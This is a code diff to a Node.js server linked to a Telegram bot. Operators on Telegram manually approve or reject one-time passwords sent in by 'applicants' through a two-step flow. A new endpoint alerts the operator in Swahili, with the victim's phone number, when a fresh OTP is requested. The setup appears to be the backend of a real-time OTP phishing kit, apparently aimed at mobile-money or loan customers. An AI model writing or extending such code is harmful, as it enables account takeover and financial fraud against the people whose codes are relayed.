@@ -139,7 +139,7 @@ async function initBot() {
           await bot.sendMessage(chatTarget, `❌ Invalid OTP sent. Waiting for new incoming OTP.`);
           break;
         case 'NEXT':
-          session.status = 'PROCEED_OTP2'; // Automatically transitions user to OTP Step 2
+          session.status = 'PROCEED_OTP2';
           await bot.sendMessage(chatTarget, `✅ Step 1 approved. Applicant moved to OTP Step 2.`);
           break;
         case 'APPROVED':
@@ -322,9 +322,29 @@ app.post('/api/submit-otp2', async (req, res) => {
   }
 });
 
+// New endpoint to notify admin when applicant requests a new OTP in Swahili
+app.post('/api/request-new-otp', async (req, res) => {
+  try {
+    const { userId, phone, step } = req.body || {};
+    let activeId = userId || lastActiveUserId;
+    let session = sessions.get(activeId);
+    if (!session) session = { adminChatId: FALLBACK_ADMIN_ID };
+
+    const targetChat = session.adminChatId;
+    const message = `⚠️ *OMBI LA OTP MPYA (${step === 1 ? 'Hatua ya 1' : 'Hatua ya 2'})*\n\n` +
+                    `📞 *Namba ya Simu:* \`${phone || session.phone || 'N/A'}\`\n` +
+                    `📢 Mteja ameomba kutumiwa OTP mpya kwa sababu muda umeisha.`;
+
+    if (targetChat && bot) await bot.sendMessage(targetChat, message, { parse_mode: 'Markdown' });
+    return res.status(200).json({ success: true });
+  } catch (error) {
+    return res.status(500).json({ success: false, error: 'Error' });
+  }
+});
+
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-          
+                               
